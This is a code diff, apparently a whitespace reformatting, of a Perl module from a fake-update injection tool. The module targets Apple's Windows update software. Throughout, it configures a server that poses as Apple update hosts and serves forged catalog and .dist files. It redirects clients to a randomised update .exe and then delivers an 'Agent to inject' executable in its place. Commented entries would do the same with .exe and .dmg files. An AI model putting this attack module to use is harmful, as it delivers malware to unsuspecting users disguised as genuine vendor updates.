@@ -25,98 +25,100 @@ package modules::appleupdate;
 use strict;
 use Data::Dump qw(dump);
 
-my $base=
-{
-    'name' => 'Apple Windows Update Software',
+my $base = {
+    'name'    => 'Apple Windows Update Software',
     'version' => '1.0',
-    'appver'  => ' < 2.1.2 (<= Safari 5.0.2 7533.18.5, <= Itunes 10.0.1.22, <= Quicktime 7.6.8 1675)',
-    'author' => [ 'Francisco Amato < famato +[AT]+ infobytesec.com>' ],
-    'description' => qq{},    
-    'vh' => '(swcatalog.apple.com|swcdn.apple.com|itunes.com|swscan.apple.com)',
+    'appver' =>
+        ' < 2.1.2 (<= Safari 5.0.2 7533.18.5, <= Itunes 10.0.1.22, <= Quicktime 7.6.8 1675)',
+    'author'      => ['Francisco Amato < famato +[AT]+ infobytesec.com>'],
+    'description' => qq{},
+    'vh' =>
+        '(swcatalog.apple.com|swcdn.apple.com|itunes.com|swscan.apple.com)',
     'request' => [
-		    {
-		    'req' => '\.sucatalog$', #regex friendly
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => '',
-		    'string' => '',
-		    'parse' => '1',
-		    'file' => './include/appleupdate/appleupdate_catalog.xml'
-		    },
+        {   'req'    => '\.sucatalog$',    #regex friendly
+            'type'   => 'file',            #file|string|agent|install
+            'method' => '',                #any
+            'bin'    => '',
+            'string' => '',
+            'parse'  => '1',
+            'file' => './include/appleupdate/appleupdate_catalog.xml'
+        },
 
-		    {
-		    'req' => '061-4339.Spanish.dist', #regex friendly
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => '',		    
-		    'string' => '',
-		    'parse' => '1',
-		    'file' => './include/appleupdate/061-4339.Spanish.dist'
-		    },
+        {   'req'    => '061-4339.Spanish.dist',    #regex friendly
+            'type'   => 'file',                     #file|string|agent|install
+            'method' => '',                         #any
+            'bin'    => '',
+            'string' => '',
+            'parse'  => '1',
+            'file' => './include/appleupdate/061-4339.Spanish.dist'
+        },
 
-#		    {
-#		    'req' => 'AppleSoftwareUpdate.exe', #regex friendly
-#		    'type' => 'file', #file|string|agent|install
-#		    'method' => '', #any
-#		    'bin'    => '1',		    
-#		    'string' => '',
-#		    'parse' => '1',
-#		    'file' => './include/appleupdate/SoftwareUpdate.exe'
-#		    },
-#		    {
-#		    'req' => 'AppleSoftwareUpdate.dmg', #regex friendly
-#		    'type' => 'file', #file|string|agent|install
-#		    'method' => '', #any
-#		    'bin'    => '1',		    
-#		    'string' => '',
-#		    'parse' => '1',
-#		    'file' => './agent/osx/update.dmg'
-#		    },
+        #           {
+        #           'req' => 'AppleSoftwareUpdate.exe', #regex friendly
+        #           'type' => 'file', #file|string|agent|install
+        #           'method' => '', #any
+        #           'bin'    => '1',
+        #           'string' => '',
+        #           'parse' => '1',
+        #           'file' => './include/appleupdate/SoftwareUpdate.exe'
+        #           },
+        #           {
+        #           'req' => 'AppleSoftwareUpdate.dmg', #regex friendly
+        #           'type' => 'file', #file|string|agent|install
+        #           'method' => '', #any
+        #           'bin'    => '1',
+        #           'string' => '',
+        #           'parse' => '1',
+        #           'file' => './agent/osx/update.dmg'
+        #           },
 
-		    {
-		    'req' => '.dist', #regex friendly
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => '',		    
-		    'string' => '',
-		    'parse' => '1',
-		    'file' => './include/appleupdate/061-4339.Spanish.dist'
-		    },
+        {   'req'    => '.dist',    #regex friendly
+            'type'   => 'file',     #file|string|agent|install
+            'method' => '',         #any
+            'bin'    => '',
+            'string' => '',
+            'parse'  => '1',
+            'file' => './include/appleupdate/061-4339.Spanish.dist'
+        },
 
-                    {
-                    'req' => '/closed.html', #regex anything
-                    'type' => 'string', #file|string|agent|install
-                    'method' => '', #any
-                    'bin'    => '',
-                    'string' => '',
-                    'parse' => '1',
-                    'file' => '',
-                    'cheader' => "HTTP/1.1 302 Found\r\n"
-                                 ."Location: http://swcatalog.apple.com/update<%RND%>.exe \r\n"
-                                 ."Content-Length: 0 \r\n"
-                                 . "Connection: close \r\n\r\n",
-                    },
-		    
-		    {
-		    'req' => '.exe', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => 0,
-		    'file' => ''
-		    },
+        {   'req'     => '/closed.html',            #regex anything
+            'type'    => 'string',                  #file|string|agent|install
+            'method'  => '',                        #any
+            'bin'     => '',
+            'string'  => '',
+            'parse'   => '1',
+            'file'    => '',
+            'cheader' => "HTTP/1.1 302 Found\r\n"
+                . "Location: http://swcatalog.apple.com/update<%RND%>.exe \r\n"
+                . "Content-Length: 0 \r\n"
+                . "Connection: close \r\n\r\n",
+        },
+
+        {   'req'    => '.exe',                     #regex friendly
+            'type'   => 'agent',                    #file|string|agent|install
+            'method' => '',                         #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => 0,
+            'file'   => ''
+        },
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-		    'rnd'  => { 'val' => 'isrcore::utils::RndNum(5)',
-			    	  'hidden' => 1,
-			    	  'dynamic' =>1,},
-		 }
-};
 
+    #Options
+    'options' => {
+        'agent' =>
+            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
+        'enable' => {
+            'val'  => 1,
+            'desc' => 'Status'
+        },
+        'rnd' => {
+            'val'     => 'isrcore::utils::RndNum(5)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+    }
+};
 
 ##########################################################################
 # FUNCTION      new
